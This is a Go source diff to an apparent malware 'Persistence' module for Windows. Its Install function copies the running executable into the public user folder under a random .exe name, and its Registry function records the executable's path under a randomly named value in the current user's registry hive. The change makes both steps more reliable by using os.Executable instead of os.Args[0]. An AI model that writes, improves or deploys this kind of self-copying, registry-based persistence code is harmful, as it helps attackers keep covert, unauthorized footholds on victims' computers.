@@ -23,13 +23,17 @@ func (p *Persistence) Init(config Config) error {
 }
 
 func Install() error {
-	if !strings.Contains(os.Args[0], os.Getenv("public")) {
-		err := CopyFile(os.Args[0], os.Getenv("public")+"\\"+RandomString(7)+".exe")
+	filename, err := os.Executable()
+	if err != nil {
+		return err
+	}
+	if !strings.Contains(filename, os.Getenv("public")) {
+		err := CopyFile(filename, os.Getenv("public")+"\\"+RandomString(7)+".exe")
 		if err != nil {
 			return err
 		}
 	}
-	cFilename, err := syscall.UTF16PtrFromString(os.Args[0])
+	cFilename, err := syscall.UTF16PtrFromString(filename)
 	if err != nil {
 		return err
 	}
@@ -41,6 +45,10 @@ func Install() error {
 }
 
 func Registry() error {
+	filename, err := os.Executable()
+	if err != nil {
+		return err
+	}
 	registryName := RandomString(8)
 	key, err := registry.OpenKey(registry.CURRENT_USER,
 		`Software\Microsoft\Windows\CurrentVersion\Audio`,
@@ -48,7 +56,7 @@ func Registry() error {
 	if err != nil {
 		return err
 	}
-	if err := key.SetStringValue(registryName, os.Args[0]); err != nil {
+	if err := key.SetStringValue(registryName, filename); err != nil {
 		return err
 	}
 	if err := key.Close(); err != nil {
